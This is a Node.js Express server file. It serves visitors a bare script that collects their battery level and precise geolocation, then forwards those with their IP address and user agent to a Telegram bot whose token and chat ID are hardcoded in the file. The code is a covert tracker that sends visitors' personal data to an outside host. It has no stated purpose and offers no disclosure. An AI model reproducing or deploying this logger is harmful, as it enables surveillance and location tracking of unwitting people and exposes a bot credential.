const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

const TELEGRAM_BOT_TOKEN = '7749604293:AAHlRr16NUJPHRiQ4QqbRkMKQMzVqFDrUCw';
const TELEGRAM_CHAT_ID = '7064862085';

const sendToTelegram = (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  axios.post(url, {
    chat_id: TELEGRAM_CHAT_ID,
    text: message
  }).catch(err => console.error('Error sending message:', err));
};

app.get('/', (req, res) => {
  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  let userAgent = req.headers['user-agent'];

  let script = `
    <script>
      navigator.getBattery().then(battery => {
        fetch('/battery?level=' + battery.level);
      });

      navigator.geolocation.getCurrentPosition(position => {
        fetch('/location?lat=' + position.coords.latitude + '&long=' + position.coords.longitude);
      });

      fetch('/user?id=' + navigator.userAgent);
    </script>
  `;
  res.send(script);
  sendToTelegram('New visitor IP: ' + ip + '\nUser Agent: ' + userAgent);
});

app.get('/battery', (req, res) => {
  sendToTelegram('Battery Level: ' + req.query.level);
  res.send('Battery level received');
});

app.get('/location', (req, res) => {
  sendToTelegram('Location: ' + req.query.lat + ', ' + req.query.long);
  res.send('Location received');
});

app.get('/user', (req, res) => {
  sendToTelegram('User Agent: ' + req.query.id);
  res.send('User info received');
});

app.listen(port, () => {
  console.log(`Listening on port ${port}`);
});
 
